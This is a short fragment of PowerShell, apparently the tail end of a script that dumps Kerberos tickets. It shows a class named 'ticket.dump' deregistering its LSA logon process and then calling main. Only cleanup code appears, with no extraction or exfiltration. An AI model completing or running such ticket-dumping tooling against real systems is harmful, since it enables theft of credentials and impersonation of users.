@(,$sc)}}[ticket.dump]::LsaDeregisterLogonProcess($lh)|Out-Null;DSC $scs}$dtk = $false;main}